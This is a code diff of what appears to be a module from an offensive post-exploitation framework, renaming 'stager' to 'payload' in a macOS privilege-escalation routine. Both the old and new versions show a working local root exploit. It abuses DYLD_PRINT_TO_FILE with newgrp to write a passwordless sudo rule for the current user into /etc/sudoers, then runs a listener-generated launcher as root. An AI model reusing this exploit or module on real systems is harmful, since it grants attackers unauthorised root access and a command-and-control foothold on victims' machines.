@@ -107,7 +107,7 @@ class Module:
 	userAgent = self.options['UserAgent']['Value']
 	safeChecks = self.options['SafeChecks']['Value']
 
-        launcher = self.mainMenu.stagers.generate_launcher(listenername, language='python', userAgent=userAgent, safeChecks=safeChecks)
+        launcher = self.mainMenu.payloads.generate_launcher(listenername, language='python', userAgent=userAgent, safeChecks=safeChecks)
 	if launcher == "":
 		print helpers.color("[!] Error in launcher generation")
 	launcher = launcher.replace("\"","\\\"")
@@ -115,14 +115,14 @@ class Module:
         fileName = self.options['FileName']['Value']
         script = """
 import os
-print "Writing Stager to {filename}..."
+print "Writing payload to {filename}..."
 file = open("{fullpath}","w")
 file.write("{filecontents}")
 file.close()
-print "Attempting to execute stager as root..."
+print "Attempting to execute payload as root..."
 try:
 	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
-	print "Successfully ran command, you should be getting an elevated stager"
+	print "Successfully ran command, you should be getting an elevated payload"
 except:
 	print "[!] Could not execute payload!"
             
